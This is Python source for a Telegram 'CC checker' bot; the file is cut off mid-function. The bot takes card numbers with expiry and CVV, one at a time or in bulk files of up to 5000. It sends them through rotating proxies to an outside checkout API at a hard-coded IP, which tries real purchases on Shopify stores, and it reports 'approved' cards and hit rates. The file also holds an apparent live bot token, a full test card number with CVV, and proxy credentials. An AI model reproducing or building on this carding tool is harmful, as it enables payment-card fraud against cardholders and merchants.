#!/usr/bin/env python3
"""
Telegram CC Checker Bot
python-telegram-bot v21 implementation
"""

import os
import sys
import json
import re
import time
import random
import asyncio
import logging
import datetime
import io
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackContext
)
from telegram.constants import ParseMode

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
BOT_TOKEN = "8036843497:AAH2wwf4rIpPBMiPQlfR8s82_eC1j8VeESw"
OWNER_ID = 6821529235
API_BASE_URL = "http://140.99.254.73:3000/checkout"

# Bot settings
MAX_PROXIES = 20
MAX_MASS_CARDS = 5000
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30

# Paths
BASE_DIR = Path(__file__).parent
SITES_FILE = BASE_DIR / "sites.json"
PROXIES_FILE = BASE_DIR / "proxies.json"
STATS_FILE = BASE_DIR / "stats.json"
SCRIPTS_DIR = BASE_DIR / "scripts"

# Status mappings
status_emoji = {
    'APPROVED': '✅',
    'APPROVED_OTP': '✅',
    'DECLINED': '❌',
    'EXPIRED': '📅',
    'ERROR': '⚠️'
}

status_text = {
    'APPROVED': 'APPROVED',
    'APPROVED_OTP': 'APPROVED OTP',
    'DECLINED': 'DECLINED',
    'EXPIRED': 'EXPIRED',
    'ERROR': 'ERROR'
}

# Initialize logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Global data stores
sites = []
proxies = []
stats = {
    "total_checks": 0,
    "approved": 0,
    "declined": 0,
    "expired": 0,
    "error": 0,
    "mass_checks": 0,
    "sites_count": 0,
    "proxies_count": 0
}

# Test CC for site testing
TEST_CC = "4263703530924474|06|2026|400"

# ========== DATA MANAGEMENT FUNCTIONS ==========

def load_data():
    """Load data from JSON files"""
    global sites, proxies, stats
    
    try:
        if SITES_FILE.exists():
            with open(SITES_FILE, 'r') as f:
                sites = json.load(f)
                if not isinstance(sites, list):
                    sites = ["https://9marks.myshopify.com"]
        else:
            sites = ["https://9marks.myshopify.com"]
            save_data("sites")
    except Exception as e:
        logger.error(f"Error loading sites: {e}")
        sites = ["https://9marks.myshopify.com"]
    
    try:
        if PROXIES_FILE.exists():
            with open(PROXIES_FILE, 'r') as f:
                proxies = json.load(f)
                if not isinstance(proxies, list):
                    proxies = []
        else:
            proxies = []
    except Exception as e:
        logger.error(f"Error loading proxies: {e}")
        proxies = []
    
    try:
        if STATS_FILE.exists():
            with open(STATS_FILE, 'r') as f:
                loaded_stats = json.load(f)
                # Update stats dict with loaded values
                for key in stats:
                    if key in loaded_stats:
                        stats[key] = loaded_stats[key]
    except Exception as e:
        logger.error(f"Error loading stats: {e}")
    
    # Ensure scripts directory exists
    SCRIPTS_DIR.mkdir(exist_ok=True)

def save_data(data_type: str):
    """Save data to JSON files"""
    try:
        if data_type == "sites":
            with open(SITES_FILE, 'w') as f:
                json.dump(sites, f, indent=2)
        elif data_type == "proxies":
            with open(PROXIES_FILE, 'w') as f:
                json.dump(proxies, f, indent=2)
        elif data_type == "stats":
            with open(STATS_FILE, 'w') as f:
                json.dump(stats, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving {data_type}: {e}")

def update_stats(status: str, mass_check: bool = False):
    """Update bot statistics"""
    stats["total_checks"] += 1
    if status == 'APPROVED' or status == 'APPROVED_OTP':
        stats["approved"] += 1
    elif status == 'DECLINED':
        stats["declined"] += 1
    elif status == 'EXPIRED':
        stats["expired"] += 1
    elif status == 'ERROR':
        stats["error"] += 1
    
    if mass_check:
        stats["mass_checks"] += 1
    
    stats["sites_count"] = len(sites)
    stats["proxies_count"] = len(proxies)
    
    save_data("stats")

# ========== HELPER FUNCTIONS ==========

def extract_cc(text: str) -> Optional[str]:
    """Extract CC from various formats"""
    # Remove any non-ASCII characters
    text = ''.join(char for char in text if ord(char) < 128)
    
    # Common CC patterns
    patterns = [
        r'(\d{16})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
        r'(\d{15})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
        r'(\d{16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            groups = match.groups()
            cc = groups[0]
            mm = groups[1].zfill(2)
            yyyy = groups[2]
            
            # Handle 2-digit year
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            
            cvv = groups[3]
            return f"{cc}|{mm}|{yyyy}|{cvv}"
    
    return None

def extract_multiple_ccs(text: str) -> List[str]:
    """Extract multiple CCs from text"""
    ccs = []
    lines = text.split('\n')
    
    for line in lines:
        line = line.strip()
        if line:
            cc = extract_cc(line)
            if cc:
                ccs.append(cc)
    
    return ccs

def get_bin_info(card_number: str) -> Dict[str, str]:
    """Get BIN info from antipublic API"""
    bin_number = card_number[:6]
    try:
        response = requests.get(
            f"https://lookup.binlist.net/{bin_number}",
            headers={'Accept-Version': '3'},
            timeout=10
        )
        if response.status_code == 200:
            data = response.json()
            return {
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "country_code": data.get("country", {}).get("alpha2", ""),
                "type": data.get("type", "Unknown"),
                "brand": data.get("brand", "Unknown"),
                "scheme": data.get("scheme", "Unknown")
            }
    except Exception as e:
        logger.error(f"Error fetching BIN info: {e}")
    
    return {
        "bank": "Unknown",
        "country": "Unknown",
        "country_code": "",
        "type": "Unknown",
        "brand": "Unknown",
        "scheme": "Unknown"
    }

def create_session_with_retries() -> requests.Session:
    """Create requests session with retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def parse_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
    """Parse proxy string into components"""
    try:
        parts = proxy_str.split(':')
        if len(parts) != 4:
            return None
        
        host, port, username, password = parts
        proxy_url = f"http://{username}:{password}@{host}:{port}"
        
        return {
            "host": host,
            "port": port,
            "username": username,
            "password": password,
            "url": proxy_url,
            "string": proxy_str
        }
    except Exception as e:
        logger.error(f"Error parsing proxy: {e}")
        return None

def get_concurrent_limit(proxy_count: int) -> int:
    """Calculate concurrent limit based on proxy count"""
    if proxy_count >= 15:
        return 15
    elif proxy_count >= 10:
        return 10
    elif proxy_count >= 5:
        return 5
    elif proxy_count >= 3:
        return 3
    elif proxy_count == 2:
        return 2
    elif proxy_count == 1:
        return 1
    return 0

# ========== API FUNCTIONS ==========

def is_valid_response(response_text: str) -> bool:
    """Check if API response is valid"""
    if not response_text or not isinstance(response_text, str):
        return False
    
    invalid_responses = [
        "error",
        "proxy error",
        "timeout",
        "connection failed",
        "invalid",
        "bad gateway",
        "gateway timeout"
    ]
    
    response_lower = response_text.lower()
    for invalid in invalid_responses:
        if invalid in response_lower:
            return False
    
    return True

def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, str]:
    """Process API response and determine status"""
    if not is_valid_response(api_response):
        return "API ERROR", "DECLINED", f"${price:.2f}"
    
    response_upper = api_response.upper()
    
    if 'THANK YOU' in response_upper:
        return 'ORDER CONFIRM!', 'APPROVED', f"${price:.2f}"
    elif '3D' in response_upper:
        return 'OTP_REQUIRED', 'APPROVED_OTP', f"${price:.2f}"
    elif any(x in response_upper for x in ['EXPIRED_CARD', 'EXPIRE_CARD', 'EXPIRED']):
        return 'EXPIRE_CARD', 'EXPIRED', f"${price:.2f}"
    elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
        return api_response, 'APPROVED_OTP', f"${price:.2f}"
    elif 'CARD_DECLINED' in response_upper:
        return 'CARD_DECLINED', 'DECLINED', f"${price:.2f}"
    elif 'INCORRECT_NUMBER' in response_upper:
        return 'INCORRECT_NUMBER', 'DECLINED', f"${price:.2f}"
    elif 'FRAUD_SUSPECTED' in response_upper:
        return 'FRAUD_SUSPECTED', 'DECLINED', f"${price:.2f}"
    elif 'INVALID_TOKEN' in response_upper:
        return 'INVALID_TOKEN', 'DECLINED', f"${price:.2f}"
    elif 'AUTHENTICATION_ERROR' in response_upper:
        return 'AUTHENTICATION_ERROR', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_402' in response_upper:
        return 'PAYMENT REQUIRED', 'DECLINED', f"${price:.2f}"
    elif 'API_ERROR_' in response_upper:
        return 'API ERROR', 'DECLINED', f"${price:.2f}"
    else:
        return api_response, 'DECLINED', f"${price:.2f}"

def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool, str, float]:
    """Test proxy with actual API call"""
    try:
        cc = TEST_CC
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        response_text = response.text.strip() if response.status_code == 200 else f"HTTP {response.status_code}"
        
        return is_valid_response(response_text), response_text, response_time
        
    except requests.exceptions.RequestException as e:
        logger.error(f"Proxy test error: {e}")
        return False, str(e), 0.0
    except Exception as e:
        logger.error(f"Unexpected error in proxy test: {e}")
        return False, str(e), 0.0

def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, Any]:
    """Main check function with proxy"""
    result = {
        "success": False,
        "response": "",
        "status": "ERROR",
        "gateway": "",
        "price": 0.00,
        "response_time": 0.0,
        "proxy_status": "❌",
        "error": ""
    }
    
    try:
        api_url = f"{API_BASE_URL}?cc={cc}&site={site_url}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }
        
        proxy_config = {
            'http': proxy_dict['url'],
            'https': proxy_dict['url']
        }
        
        session = create_session_with_retries()
        start_time = time.time()
        
        response = session.get(
            api_url,
            headers=headers,
            proxies=proxy_config,
            timeout=REQUEST_TIMEOUT,
            verify=False
        )
        
        response_time = time.time() - start_time
        
        if response.status_code == 200:
            response_text = response.text.strip()
            result["response"] = response_text
            result["response_time"] = response_time
            result["proxy_status"] = "✅"
            
            # Extract price from site URL (placeholder logic)
            price_match = re.search(r'\$(\d+\.?\d*)', site_url)
            if price_match:
                result["price"] = float(price_match.group(1))
            
            # Process response
            processed_response, status, gateway = process_response(response_text, result["price"])
            result["response"] = processed_response
            result["status"] = status
            result["gateway"] = gateway
            result["success"] = True
        else:
            result["error"] = f"HTTP {response.status_code}"
            
    except requests.exceptions.ProxyError as e:
        result["error"] = f"Proxy Error: {str(e)}"
    except requests.exceptions.ConnectTimeout as e:
        result["error"] = f"Connection Timeout: {str(e)}"
    except requests.exceptions.ConnectionError as e:
        result["error"] = f"Connection Error: {str(e)}"
    except requests.exceptions.RequestException as e:
        result["error"] = f"Request Error: {str(e)}"
    except Exception as e:
        result["error"] = f"Unexpected Error: {str(e)}"
    
    return result

def format_message(cc: str, result: Dict[str, Any], bin_info: Dict[str, str], 
                   proxy_str: str, response_time: float, user_name: str) -> str:
    """Format result message"""
    parts = cc.split('|')
    card_number = parts[0] if len(parts) > 0 else ""
    
    # Format card number for display
    if len(card_number) == 16:
        display_cc = f"{card_number[:4]}********{card_number[12:]}"
    else:
        display_cc = card_number
    
    formatted_cc = f"{display_cc}|{parts[1]}|{parts[2][-2:]}|{parts[3]}" if len(parts) == 4 else cc
    
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    proxy_parts = proxy_str.split(':')
    proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) >= 2 else proxy_str
    
    emoji = status_emoji.get(result["status"], "⚠️")
    status_display = status_text.get(result["status"], result["status"])
    
    country_flag = f"🇺🇸"  # Default flag
    if bin_info["country_code"]:
        try:
            # Convert country code to regional indicator symbols
            code = bin_info["country_code"].upper()
            if len(code) == 2:
                flag = ''.join(chr(127397 + ord(c)) for c in code)
                country_flag = flag
        except:
            pass
    
    message = f"""
┌─────────────────
│ {emoji} {status_display}
└─────────────────

💳 <b>Card:</b> <code>{formatted_cc}</code>
⚡ <b>Gateway:</b> {result.get('gateway', 'Unknown')}
📝 <b>Response:</b> <code>{result.get('response', '')[:50]}</code>
─────────────────
🏦 <b>Issuer:</b> {bin_info.get('bank', 'Unknown')}
🌍 <b>Country:</b> {bin_info.get('country', 'Unknown')} {country_flag}
🔢 <b>Type:</b> {bin_info.get('brand', 'Unknown')} ({bin_info.get('type', 'Unknown')})
─────────────────
👤 <b>User:</b> {user_name}
⏱️ <b>Time:</b> {result.get('response_time', 0.0):.2f} seconds
🌐 <b>Proxy:</b> {proxy_display} {result.get('proxy_status', '❌')}
🕒 <b>Checked:</b> {current_time}
"""
    
    return message.strip()

def format_mass_message(total_cards: int, approved_count: int, declined_count: int, 
                        site: str, proxy_count: int) -> str:
    """Format mass check results message"""
    hit_rate = (approved_count / total_cards * 100) if total_cards > 0 else 0
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 📊 MASS CHECK RESULTS
└─────────────────

<b>📁 Total Cards:</b> {total_cards}
<b>🔗 Site Used:</b> {site}
<b>🌐 Proxies Used:</b> {proxy_count}
<b>⚡ Concurrent Limit:</b> {concurrent_limit}

<b>✅ Approved:</b> {approved_count}
<b>❌ Declined:</b> {declined_count}

<b>🎯 Hit Rate:</b> {hit_rate:.1f}%
"""
    
    return message.strip()

# ========== COMMAND HANDLERS ==========

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_name = user.first_name or "User"
    
    proxy_count = len(proxies)
    site_count = len(sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = f"""
┌─────────────────
│ 💳 CC CHECKER BOT
└─────────────────

<b>Welcome {user_name}!</b>

<b>📊 Current Status:</b>
• 🌐 Proxies: {proxy_count} (REQUIRED)
• 🔗 Sites: {site_count}
• ⚡ Concurrent Limit: {concurrent_limit}

<b>⚠️ IMPORTANT:</b>
You must add proxies before checking!
More proxies = faster mass checking.

<b>📋 Commands:</b>

<b>🔍 Single Check:</b>
/chk CC|MM|YYYY|CVV
Reply to a message with CC

<b>📁 Mass Check:</b>
/mass - Send TXT file with CCs (max 5000)

<b>🌐 Proxy Management:</b>
/addproxy host:port:user:pass - Add proxy (max 20)
/listproxies - List all proxies
/clearproxies - Clear all proxies
/testproxy host:port:user:pass - Test a proxy

<b>🔧 Site Management:</b>
/addsite URL - Add single site
/maddsites URL1 URL2 ... - Add multiple sites
/listsites - List all sites
/clearsites - Clear all sites
/testsite URL - Test a site

<b>📊 Stats:</b>
/stats - Bot statistics
"""
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    user = update.effective_user
    
    # Check if proxies are available
    if not proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "You must add at least 1 proxy before checking.\n"
            "Use: /addproxy host:port:username:password\n\n"
            "Example: /addproxy 216.10.27.159:6837:ggehzsqw:j6u1cagd9x19",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if sites are available
    if not sites:
        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
        return
    
    # Get CC from command arguments or replied message
    cc_text = None
    if context.args:
        cc_text = ' '.join(context.args)
    elif update.message.reply_to_message:
        cc_text = update.message.reply_to_message.text
    
    if not cc_text:
        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
        return
    
    # Extract CC
    cc = extract_cc(cc_text)
    if not cc:
        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
        return
    
    # Send processing message
    processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
    
    # Get random proxy and site
    proxy_dict = random.choice(proxies)
    site = random.choice(sites)
    
    # Perform check
    result = check_site(site, cc, proxy_dict)
    
    # Get BIN info
    card_number = cc.split('|')[0]
    bin_info = get_bin_info(card_number)
    
    # Update statistics
    update_stats(result["status"], mass_check=False)
    
    # Format and send result
    user_name = user.first_name or user.username or "User"
    message = format_message(cc, result, bin_info, proxy_dict["string"], 
                            result["response_time"], user_name)
    
    await processing_msg.delete()
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /mass command"""
    # Check if proxies are available
    if not proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "You must add at least 1 proxy before mass checking.\n"
            "Use: /addproxy host:port:username:password",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Check if sites are available
    if not sites:
        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
        return
    
    proxy_count = len(proxies)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    message = (
        "📁 <b>Please send a TXT file with CCs (max 5000).</b>\n"
        "Format: CC|MM|YYYY|CVV each on new line.\n\n"
        f"🌐 <b>Proxies Available:</b> {proxy_count}\n"
        f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards at once"
    )
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addproxy command"""
    # Check if user is owner
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    
    # Check if proxy already exists
    for proxy in proxies:
        if proxy["string"] == proxy_str:
            await update.message.reply_text("⚠️ Proxy already exists.")
            return
    
    # Check max proxies
    if len(proxies) >= MAX_PROXIES:
        await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed. Use /clearproxies to remove some.")
        return
    
    # Parse proxy
    proxy_dict = parse_proxy(proxy_str)
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    # Test proxy with API
    test_msg = await update.message.reply_text("🔄 Testing proxy with API...")
    
    site = sites[0] if sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    if success:
        # Add proxy to list
        proxies.append(proxy_dict)
        save_data("proxies")
        
        concurrent_limit = get_concurrent_limit(len(proxies))
        
        await test_msg.delete()
        await update.message.reply_text(
            f"✅ <b>Proxy added successfully!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>User:</b> {proxy_dict['username']}\n"
            f"<b>Status:</b> Working with API ✅\n\n"
            f"📊 <b>Proxies:</b> {len(proxies)}/{MAX_PROXIES}\n"
            f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards\n\n"
            f"<i>More proxies = faster mass checking!</i>",
            parse_mode=ParseMode.HTML
        )
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> Proxy failed API test\n\n"
            "Check your proxy credentials and server.\n"
            "Make sure proxy is working with the checkout API.",
            parse_mode=ParseMode.HTML
        )

async def listproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listproxies command"""
    if not proxies:
        await update.message.reply_text("❌ No proxies available.")
        return
    
    message = "🌐 <b>Available Proxies:</b>\n\n"
    
    for i, proxy in enumerate(proxies, 1):
        message += f"{i}. <code>{proxy['host']}:{proxy['port']}</code>\n"
        message += f"   👤 {proxy['username']}\n"
    
    message += f"\n📊 Total: {len(proxies)}/{MAX_PROXIES}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def clearproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearproxies command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not proxies:
        await update.message.reply_text("⚠️ No proxies to clear.")
        return
    
    count = len(proxies)
    proxies.clear()
    save_data("proxies")
    
    await update.message.reply_text(f"✅ Cleared {count} proxies.")

async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /testproxy command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    proxy_str = ' '.join(context.args)
    proxy_dict = parse_proxy(proxy_str)
    
    if not proxy_dict:
        await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
        return
    
    # Test proxy with API
    test_msg = await update.message.reply_text("🔄 Testing proxy with API call...")
    
    site = sites[0] if sites else "https://9marks.myshopify.com"
    success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
    
    if success:
        await test_msg.delete()
        await update.message.reply_text(
            f"✅ <b>Proxy Test Successful!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>User:</b> {proxy_dict['username']}\n"
            f"<b>Status:</b> Working with API ✅\n\n"
            "Use /addproxy to add this proxy to your list.",
            parse_mode=ParseMode.HTML
        )
    else:
        await test_msg.delete()
        await update.message.reply_text(
            f"❌ <b>Proxy Test Failed!</b>\n\n"
            f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
            f"<b>Error:</b> Proxy failed API test\n\n"
            "Proxy cannot connect to the checkout API.\n"
            "Check credentials and proxy server status.",
            parse_mode=ParseMode.HTML
        )

async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addsite command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /addsite URL")
        return
    
    url = ' '.join(context.args).strip()
    
    # Validate URL
    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
        return
    
    # Check if site already exists
    if url in sites:
        await update.message.reply_text("⚠️ Site already exists.")
        return
    
    sites.append(url)
    save_data("sites")
    
    await update.message.reply_text(f"✅ Site added: {url}")

async def maddsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /maddsites command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /maddsites URL1 URL2 ...")
        return
    
    added = 0
    existing = 0
    
    for url in context.args:
        url = url.strip()
        if url.startswith(('http://', 'https://')):
            if url not in sites:
                sites.append(url)
                added += 1
            else:
                existing += 1
    
    if added > 0:
        save_data("sites")
    
    await update.message.reply_text(f"✅ Added {added} new sites, {existing} already existed.")

async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listsites command"""
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    message = "🔗 <b>Available Sites:</b>\n\n"
    
    for i, site in enumerate(sites, 1):
        message += f"{i}. {site}\n"
    
    message += f"\n📊 Total: {len(sites)}"
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def clearsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /clearsites command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not sites:
        await update.message.reply_text("⚠️ No sites to clear.")
        return
    
    count = len(sites)
    sites.clear()
    # Add default site
    sites.append("https://9marks.myshopify.com")
    save_data("sites")
    
    await update.message.reply_text(f"✅ Cleared {count} sites (default site added).")

async def testsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /testsite command"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Owner only command.")
        return
    
    if not proxies:
        await update.message.reply_text("❌ No proxies available. Add a proxy first to test the site.")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /testsite URL")
        return
    
    url = ' '.join(context.args).strip()
    
    if not url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
        return
    
    test_msg = await update.message.reply_text("🔄 Testing site with proxy...")
    
    # Get random proxy
    proxy_dict = random.choice(proxies)
    
    # Test with API
    success, response_text, response_time = test_proxy_with_api(proxy_dict, url)
    
    # Determine status
    if success:
        processed_response, status, gateway = process_response(response_text, 0.00)
        emoji = status_emoji.get(status, "⚠️")
        status_display = status_text.get(status, status)
    else:
        emoji = "❌"
        status_display = "FAILED"
        processed_response = response_text
        gateway = "Unknown"
    
    await test_msg.delete()
    
    message = f"""
┌─────────────────
│ 🔬 SITE TEST RESULT
└─────────────────

<b>🔗 Site:</b> {url}
<b>💳 Test CC:</b> {TEST_CC}
<b>🌐 Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}
<b>⏱️ Response Time:</b> {response_time:.2f}s

<b>📊 Status:</b> {emoji} {status_display}
<b>📝 Response:</b> {processed_response[:100]}
<b>⚡ Gateway:</b> {gateway}
<b>💰 Price:</b> $0.00
"""
    
    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command"""
    proxy_count = len(proxies)
    site_count = len(sites)
    concurrent_limit = get_concurrent_limit(proxy_count)
    
    total = stats["total_checks"]
    approved = stats["approved"]
    declined = stats["declined"]
    
    success_rate = (approved / total * 100) if total > 0 else 0
    
    message = f"""
┌─────────────────
│ 📊 BOT STATISTICS
└─────────────────

<b>🔢 Total Checks:</b> {total}
<b>✅ Approved:</b> {approved}
<b>🍳 Cooked:</b> {approved}
<b>❌ Declined:</b> {declined}

<b>📁 Mass Checks:</b> {stats["mass_checks"]}
<b>🌐 Total Proxies:</b> {proxy_count}/20
<b>⚡ Concurrent Limit:</b> {concurrent_limit}
<b>🔗 Total Sites:</b> {site_count}

<b>🎯 Success Rate:</b> {success_rate:.1f}%
"""
    
    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle TXT file upload for mass check"""
    if not proxies:
        await update.message.reply_text(
            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
            "You must add at least 1 proxy before mass checking.",
            parse_mode=ParseMode.HTML
        )
        return
    
    if not sites:
        await update.message.reply_text("❌ No sites available.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a TXT file.")
        return
    
    # Download file
    file = await document.get_file()
    file_content = await file.download_as_bytearray()
    
    try:
        # Decode file content
        text = file_content.decode('utf-8', errors='ignore')
        
        # Extract CCs
        ccs = extract_multiple_ccs(text)
        
        if not ccs:
            await update.message.reply_text("❌ No valid CCs found in file.")
            return
        
        # Limit to MAX_MASS_CARDS
        if len(ccs) > MAX_MASS_CARDS:
            ccs = ccs[:MAX_MASS_CARDS]
        
        total_cards = len(ccs)
        proxy_count = len(proxies)
        concurrent_limit = get_concurrent_limit(proxy_count)
        site = random.choice(sites)
        
        # Send initial status
        status_msg = await update.message.reply_text(
            f"🔄 Processing {total_cards} cards...\n\n"
            f"Checked: 0/{total_cards}\n"
            f"✅ Approved: 0\n"
            f"❌ Declined: 0\n\n"
            f"🌐 Using {proxy_count} proxies\n"
            f"⚡ Concurrent: {concurrent_limit} cards at once"
        )
        
        # Prepare for concurrent processing
        approved_cards = []
        declined_cards = []
        checked_count = 0
        
        # Create thread pool for concurrent checks
        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_limit) as executor:
            futures = []
            
            for cc in ccs:
                proxy = random.choice(proxies)
                future = executor.submit(check_site, site, cc, proxy)
                futures.append((future, cc, proxy["string"]))
            
            # Process results as they complete
            for future, cc, proxy_str in futures:
                try:
                    result = future.result(timeout=REQUEST_TIMEOUT + 5)
                    
                    checked_count += 1
                    
                    if result["status"] in ["APPROVED", "APPROVED_OTP"]:
                        approved_cards.append(cc)
                    else:
                        declined_cards.append(cc)
                    
                    # Update statistics
                    update_stats(result["status"], mass_check=True)
                    
                    # Update status message every 10 cards or at the end
                    if checked_count % 10 == 0 or checked_count == total_cards:
                        await status_msg.edit_text(
                            f"🔄 Processing {total_cards} cards...\n\n"
                            f"Checked: {checked_count}/{total_cards}\n"
                            f"✅ Approved: {len(approved_cards)}\n"
                            f"❌ Declined: {len(declined_cards)}\n\n"
                            f"🌐 Using {proxy_count} proxies\n"
                            f"⚡ Concurrent: {concurrent_limit} cards at once"
                        )
                        
                except Exception as e:
                    logger.error(f"Error processing card: {e}")
                    declined_cards.append(cc)
                    checked_count += 1
        
        # Save approved cards to file
        if approved_cards:
